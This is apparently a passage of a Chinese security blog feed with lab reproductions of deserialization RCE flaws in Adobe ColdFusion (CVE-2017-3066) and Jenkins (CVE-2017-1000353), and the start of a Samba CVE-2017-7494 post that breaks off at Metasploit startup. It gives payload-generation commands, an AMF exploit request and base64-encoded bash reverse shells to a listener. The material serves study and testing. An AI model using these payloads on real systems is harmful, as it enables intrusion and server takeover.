<p>Adobe ColdFusion是漂亮国Adobe公司的一款动态Web服务器产品，其运行的<strong>CFML（ColdFusion Markup Language）</strong>是针对Web应用的一种程序设计语言。</p>
<p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。</p>
<p>参考：<a href="https://www.wangan.com/docs/291">https://www.wangan.com/docs/291</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Adobe ColdFusion (2016 release) Update 3及之前的版本；</p>
<p>Adobe ColdFusion 11 Update 11及之前的版本；</p>
<p>Adobe ColdFusion 10 Update 22及之前的版本。</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/vulhub/coldfusion/CVE-2017-3066</span><br><span class="line">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="白名单问题"><a href="#白名单问题" class="headerlink" title="白名单问题"></a>白名单问题</h4><p>最常规的利用思路来自Adobe ColdFusion的白名单问题。</p>
<p>Adobe ColdFusion（指定存在漏洞的版本）<strong>没有采用可信类的白名单机制</strong>，这意味着只要某个类位于Adobe ColdFusion的类路径（classpath），且符合<strong>Java Beans规范</strong>或者实现了<code>java.io.Externalizable</code>，就可以发送到服务器进行反序列化。</p>
<p>实现了<code>java.io.Externalizable</code>接口的JRE类（<code>sun.rmi.server.UnicastRef2</code>和<code>sun.rmi.server.UnicastRef</code>）会在AMF3反序列化过程中触发一个TCP出站连接（可被利用作反弹Shell）。当成功连接了攻击者的服务器后，程序会使用Java原生的反序列化方法<code>ObjectInputStream.readObject()</code>来反序列化服务器的响应数据。结合Java原生反序列化和AMF反序列化让许多通用马在此场景得以应用。</p>
<h4 id="Setter问题"><a href="#Setter问题" class="headerlink" title="Setter问题"></a>Setter问题</h4><p>公开的Setter方法是Java Beans规范的一部分。</p>
<p>按照<a href="https://github.com/codewhitesec">Code White GmbH (github.com)</a>组织里大佬的做法，用Eclipse建立项目，将Adobe ColdFusion 12的所有jar包以外部库形式导入，进一步查看Java原生反序列化方法<code>ObjectInputStream.readObject()</code>的调用情况，打开”Call Hierarchy“。Eclipse支持在没有源代码的前提下根据现有类信息构造函数调用图（巨大）。</p>
<p>根据大佬的审计结果，在<code>org.jgroups.blocks.ReplicatedTree</code>类的<code>setState(byte[] new_state)</code>方法存在问题。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112095405925.png" alt="image-20211112095405925"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*      */</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(<span class="keyword">byte</span>[] new_state)</span> <span class="comment">/*      */</span> </span>&#123;</span><br><span class="line"><span class="comment">/*  597 */</span>     Node new_root = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*      */</span> <span class="comment">/*      */</span> <span class="comment">/*  600 */</span> <span class="keyword">if</span> (new_state == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">/*  601 */</span> <span class="keyword">if</span> (log.isInfoEnabled()) log.info(<span class="string">&quot;new cache is null&quot;</span>);</span><br><span class="line"><span class="comment">/*  602 */</span> <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*      */</span>     &#125;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/*  605 */</span>       Object obj = Util.objectFromByteBuffer(new_state);</span><br><span class="line"><span class="comment">/*  606 */</span>       new_root = (Node)((Node)obj).clone();</span><br><span class="line"><span class="comment">/*  607 */</span>       root = new_root;</span><br><span class="line"><span class="comment">/*  608 */</span>       notifyAllNodesCreated(root);</span><br><span class="line"><span class="comment">/*      */</span>     &#125;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="comment">/*  611 */</span> <span class="keyword">if</span> (log.isErrorEnabled()) &#123; log.error(<span class="string">&quot;could not set cache: &quot;</span> + ex);</span><br><span class="line"><span class="comment">/*      */</span>       &#125;</span><br><span class="line"><span class="comment">/*      */</span>     &#125;</span><br><span class="line"><span class="comment">/*      */</span>   &#125;</span><br></pre></td></tr></table></figure>

<p>根据函数调用图，该调用链的最后一个节点是调用<code>ObjectInputStream.readObject()</code>。</p>
<p>传递给<code>setState()</code>的<code>byte[]</code>参数在<code>0x0</code>偏移处有一个额外字节<code>0x2</code>，见<code>org.jgroups.util.Util</code>类的364行开始的代码，向下执行了一个<code>switch</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*      */</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">objectFromByteBuffer</span><span class="params">(<span class="keyword">byte</span>[] buffer, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"><span class="comment">/*      */</span> </span>&#123;</span><br><span class="line"><span class="comment">/*  358 */</span> <span class="keyword">if</span> (buffer == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*  359 */</span> <span class="keyword">if</span> (JGROUPS_COMPAT)</span><br><span class="line"><span class="comment">/*  360 */</span> <span class="keyword">return</span> oldObjectFromByteBuffer(buffer, offset, length);</span><br><span class="line"><span class="comment">/*  361 */</span>     Object retval = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*  362 */</span>     InputStream in = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*  363 */</span>     ByteArrayInputStream in_stream = <span class="keyword">new</span> ByteArrayInputStream(buffer, offset, length);</span><br><span class="line"><span class="comment">/*  364 */</span> <span class="keyword">byte</span> b = (<span class="keyword">byte</span>)in_stream.read();</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">int</span> len;</span><br><span class="line"><span class="comment">/*  367 */</span> <span class="keyword">switch</span> (b) &#123;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="comment">/*  369 */</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">/*  371 */</span>         in = <span class="keyword">new</span> DataInputStream(in_stream);</span><br><span class="line"><span class="comment">/*  372 */</span>         retval = readGenericStreamable((DataInputStream)in);</span><br><span class="line"><span class="comment">/*  373 */</span> <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*      */</span> <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">/*  375 */</span>         in = <span class="keyword">new</span> ObjectInputStream(in_stream);</span><br><span class="line"><span class="comment">/*  376 */</span>         retval = ((ObjectInputStream)in).readObject();</span><br><span class="line"><span class="comment">/*      */</span> <span class="comment">//... /*      */       &#125;</span></span><br><span class="line"><span class="comment">/*      */</span>      &#125;</span><br><span class="line"><span class="comment">/*      */</span> &#125;</span><br></pre></td></tr></table></figure>

<p>具体POC可用大佬制作的<a href="https://github.com/codewhitesec/ColdFusionPwn">codewhitesec/ColdFusionPwn: Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12 (github.com)</a>生成。</p>
<p>此漏洞利用方法要求必须是Adobe ColdFusion 12，且开启JGroups。</p>
<h4 id="Externalizable问题"><a href="#Externalizable问题" class="headerlink" title="Externalizable问题"></a>Externalizable问题</h4><p>另有一种利用思路来自<code>org.apache.axis2.util.MetaDataEntry</code>类的<code>readExternal</code>方法。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112095721955.png" alt="image-20211112095721955"></p>
<p>在代码的297行，程序会调用<code>SafeObjectInputStream.install(inObject)</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*     */</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SafeObjectInputStream <span class="title">install</span><span class="params">(ObjectInput in)</span> <span class="comment">/*     */</span> </span>&#123;</span><br><span class="line"><span class="comment">/*  62 */</span> <span class="keyword">if</span> ((in <span class="keyword">instanceof</span> SafeObjectInputStream)) &#123;</span><br><span class="line"><span class="comment">/*  63 */</span> <span class="keyword">return</span> (SafeObjectInputStream)in;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*  65 */</span> <span class="keyword">return</span> <span class="keyword">new</span> SafeObjectInputStream(in) ;</span><br><span class="line"><span class="comment">/*     */</span>   &#125;</span><br></pre></td></tr></table></figure>

<p>这个函数中，<code>AMF3Input</code>实例属于<code>org.apache.axis2.context.externalize.SafeObjectInputStream</code>类的一个实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*     */</span> <span class="function"><span class="keyword">private</span> Object <span class="title">readObjectOverride</span><span class="params">()</span> <span class="comment">/*     */</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"><span class="comment">/*     */</span> </span>&#123;</span><br><span class="line"><span class="comment">/* 318 */</span> <span class="keyword">boolean</span> isActive = in.readBoolean();</span><br><span class="line"><span class="comment">/* 319 */</span> <span class="keyword">if</span> (!isActive) &#123;</span><br><span class="line"><span class="comment">/* 320 */</span> <span class="keyword">if</span> (isDebug) &#123;</span><br><span class="line"><span class="comment">/* 321 */</span>         log.debug(<span class="string">&quot;Read object=null&quot;</span>);</span><br><span class="line"><span class="comment">/*     */</span>       &#125;</span><br><span class="line"><span class="comment">/* 323 */</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/* 325 */</span>     Object obj = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">/* 326 */</span> <span class="keyword">boolean</span> isObjectForm = in.readBoolean();</span><br><span class="line"><span class="comment">/* 327 */</span> <span class="keyword">if</span> (isObjectForm)</span><br><span class="line"><span class="comment">/*     */</span>     &#123;</span><br><span class="line"><span class="comment">/* 329 */</span> <span class="keyword">if</span> (isDebug) &#123;</span><br><span class="line"><span class="comment">/* 330 */</span>         log.debug(<span class="string">&quot; reading using object form&quot;</span>);</span><br><span class="line"><span class="comment">/*     */</span>       &#125;</span><br><span class="line"><span class="comment">/* 332 */</span>       obj = in.readObject();</span><br><span class="line"><span class="comment">/*     */</span>     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* 334 */</span> <span class="keyword">if</span> (isDebug) &#123;</span><br><span class="line"><span class="comment">/* 335 */</span>         log.debug(<span class="string">&quot; reading using byte form&quot;</span>);</span><br><span class="line"><span class="comment">/*     */</span>       &#125;</span><br><span class="line"><span class="comment">/*     */</span> <span class="comment">/* 338 */</span>       ByteArrayInputStream bais = getByteStream(in);</span><br><span class="line"><span class="comment">/*     */</span> <span class="comment">/*     */</span> <span class="comment">/* 341 */</span>       ObjectInputStream tempOIS = createObjectInputStream(bais);</span><br><span class="line"><span class="comment">/* 342 */</span>       obj = tempOIS.readObject();</span><br><span class="line"><span class="comment">/* 343 */</span>       tempOIS.close();</span><br><span class="line"><span class="comment">/* 344 */</span>       bais.close();</span><br><span class="line"><span class="comment">/*     */</span>     &#125;</span><br><span class="line"><span class="comment">/*     */</span> <span class="comment">//... /*     */   &#125;</span></span><br></pre></td></tr></table></figure>

<p>第341行创建了<code>org.apache.axis2.context.externalize.ObjectInputStreamWithCL</code>的新实例，这个类是扩展（<code>extend</code>）了标准<code>java.io.ObjectInputStream</code>类的。在342行实现了<code>readObject()</code>方法的调用。</p>
<p>同样可以利用大佬的工具生成POC，且对Adobe ColdFusion 11/12同时生效。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成<a href="https://gitee.com/cat-nineteen/tools/tree/master/tools/web-rce/CVE-2017-3066">POC</a>(这里已经打包好了，poc需要<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">下载ysoserial</a>)。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112094939207.png" alt="image-20211112094939207"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>生成payload，执行文件创建命令。</strong>在kali中执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#x27;touch /tmp/CVE-2017-3066_is_success&#x27; poc.ser</span><br></pre></td></tr></table></figure>

<p>生成poc.ser文件后，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为<code>application/x-amf</code>。使用burp抓包拦截：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /flex2gateway/amf HTTP/1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure>

<p>右击选择<strong>Paste From File</strong>，上传<strong>poc.ser</strong>文件;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112100839494.png" alt="image-20211112100839494"></p>
<p>进入容器检验POC是否成功；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器ID /bin/bash</span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112100953464.png" alt="image-20211112100953464"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>反弹shell格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>使用bash编码的payload，点击<a href="https://www.jackson-t.ca/runtime-exec-payloads.html">jackson-t.ca</a>生成;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112101336003.png" alt="image-20211112101336003"></p>
<p>kali生成poc.ser文件，将命令内容替换为反弹shell的命令，执行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMC4xMzgvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> poc.ser</span><br></pre></td></tr></table></figure>

<p>kali机器上nc监听；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p>以同样burp抓包拦截的方式将payload发送；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112101856930.png" alt="image-20211112101856930"></p>
<p>查看容器的进程状态；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112102004304.png" alt="image-20211112102004304"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Jenkins远程代码执行漏洞(CVE-2017-1000353)</title>
    <url>/2021/11/12/Jenkins%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-1000353)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>Jenkins的反序列化漏洞，攻击者使用该漏洞可以在被攻击服务器执行任意代码，漏洞利用不需要任何的权限</p>
<p>参考：<a href="https://www.cnblogs.com/backlion/p/6813260.html">https://www.cnblogs.com/backlion/p/6813260.html</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>所有Jenkins主版本均受到影响(包括&lt;=2.56版本)<br>所有Jenkins LTS 均受到影响( 包括&lt;=2.46.1版本)</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/vulhub/jenkins/CVE-2017-1000353</span><br><span class="line">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="linux搭建"><a href="#linux搭建" class="headerlink" title="linux搭建"></a>linux搭建</h3><ul>
<li><p>官方下载jenkins-2.46-1.1.noarch.rpm，<a href="http://mirrors.jenkins.io/">官网;</a></p>
</li>
<li><p>在redhat系统中安装jenkins;</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh jenkins-2.46-1.1.noarch.rpm</span><br></pre></td></tr></table></figure>

<ul>
<li>开启jenkins服务;</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service jenkins start</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171437144.png" alt="image-20211112171437144"></p>
<ul>
<li><p>浏览器访问<a href="http://ip:8080；">http://ip:8080；</a></p>
<p>如下图所示需要输入密码,密码文件在<code>/var/1ib/jenkins/secrets/initialAdminPassword</code>:</p>
</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171550762.png" alt="image-20211112171550762"></p>
<ul>
<li>输入密码后进入如下界面,选择安装建议的插件;</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171708451.png" alt="image-20211112171708451"></p>
<ul>
<li>安装完插件之后,进入如下界面,设置用户名和密码;</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171740931.png" alt="image-20211112171740931"></p>
<ul>
<li>设置完用户和密码之后,进入如下界面,点击如下图位置;</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171831492.png" alt="image-20211112171831492"></p>
<ul>
<li>至此jenkins环境搭建成功；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112171859675.png" alt="image-20211112171859675"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li>下载生成反序列的payload;</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/nobleXu/jenkins</span><br></pre></td></tr></table></figure>

<ul>
<li>下载漏洞利用代码exploit.py</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py</span><br></pre></td></tr></table></figure>

<ul>
<li>这里已经整理在了<a href="https://gitee.com/cat-nineteen/tools/tree/master/tools/web-rce/CVE-2017-1000353">gitee</a>中，阔以直接下载；</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112172133138.png" alt="image-20211112172133138"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>kali中生成执行<code>touch /tmp/success</code>的payload；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="string">&quot;touch /tmp/success&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用exp.py执行攻击；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python exploit.py http://your-ip:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>

<p>返回容器可查看文件已上传成功；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112172420770.png" alt="image-20211112172420770"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>使用bash编码的payload，点击<a href="https://www.jackson-t.ca/runtime-exec-payloads.html">jackson-t.ca</a>生成;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112101336003.png" alt="image-20211112101336003"></p>
<p>kali生成执行反弹shell的payload；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMC4xMzgvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用exp.py执行攻击；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python exploit.py http://your-ip:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Samba远程代码执行漏洞(CVE-2017-7494)</title>
    <url>/2021/11/12/Samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-7494)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>该漏洞CVE-2017-7494又被称为Linux版永恒之蓝，主要是利用smb上的反弹shell漏洞，进行远程代码执行。</p>
<p>参考：<a href="https://www.cnblogs.com/Hi-blog/p/7782356.html">https://www.cnblogs.com/Hi-blog/p/7782356.html</a></p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Samba 3.5.0之后的所有版本；</p>
<p>在4.6.4/4.5.10/4.4.14修复了这个漏洞。</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>服务器打开了文件/打印机共享端口445</li>
<li>共享文件拥有访问以及写入权限，如：匿名可写等</li>
<li>攻击者知道共享的目录路径</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/vulhub/samba/CVE-2017-7494/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h3><p>测试环境：<a href="http://old-releases.ubuntu.com/releases/14.04.1/">ubuntu-14.04.1-server-amd64 </a> （安装系统时勾选samba）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/samba -V</span><br></pre></td></tr></table></figure>

<h3 id="匿名访问配置-测试推荐"><a href="#匿名访问配置-测试推荐" class="headerlink" title="匿名访问配置(测试推荐)"></a>匿名访问配置(测试推荐)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个共享目录</span><br><span class="line">mkdir /home/share</span><br><span class="line">chmod 777 /home/share</span><br><span class="line"></span><br><span class="line"># 修改配置文件/etc/samba/smb.conf,在配置文件最后添加如下内容：</span><br><span class="line">[myshare]</span><br><span class="line">comment=smb share test</span><br><span class="line">browseable=yes #可读</span><br><span class="line">writeable=yes #可写</span><br><span class="line">path=/home/share  #设置目录（上一步创建的共享目录）</span><br><span class="line">public = yes #允许匿名登录</span><br><span class="line"></span><br><span class="line"># 　ubuntu下可以用如下命令来运行和停止服务：</span><br><span class="line">/etc/init.d/smbd start  #开启</span><br><span class="line">/etc/init.d/smbd stop   #关闭</span><br><span class="line">/etc/init.d/smbd restart #重启</span><br><span class="line">或：</span><br><span class="line">service smbd start</span><br><span class="line">service smbd stop</span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure>

<h3 id="非匿名访问配置"><a href="#非匿名访问配置" class="headerlink" title="非匿名访问配置"></a>非匿名访问配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 修改配置文件/etc/samba/smb.conf，如下：</span><br><span class="line">[myshare]</span><br><span class="line">comment=smb share test</span><br><span class="line">browseable=yes #可读</span><br><span class="line">writeable=yes #可写</span><br><span class="line">path=/home/share  #设置目录（上一步创建的共享目录）</span><br><span class="line">public = no #不允许匿名登录</span><br><span class="line"></span><br><span class="line"># 在 [global] 设置选项中添加配置：</span><br><span class="line">security = user</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211112150732194.png" alt="image-20211112150732194"></p>
<p>之后，需要添加一下用户以备登陆之需：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd user</span><br><span class="line">smbpasswd -a user</span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在is_known_pipename()函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在kali中使用msfconsole工具；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/opt/tools/CVE-2017-3066<span class="comment"># msfconsole </span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb:38: warning: key <span class="string">&quot;Platform&quot;</span> is duplicated and overwritten on line 48</span><br><span class="line">[!] The following modules were loaded with warnings:</span><br><span class="line">[!] 	/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line"> ______________________________________________________________________________</span><br><span class="line">|                                                                              |</span><br><span class="line">|                          3Kom SuperHack II Logon                             |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                 User Name:          [   security    ]                        |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                 Password:           [               ]                        |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                   [ OK ]                                     |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line">|                                                                              |</span><br><span class="line">|                                                       https://metasploit.com |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.99-dev                          ]</span><br><span class="line">+ -- --=[ 2045 exploits - 1106 auxiliary - 345 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Adapter names can be used <span class="keyword">for</span> IP params <span class="built_in">set</span> LHOST eth0</span><br><span 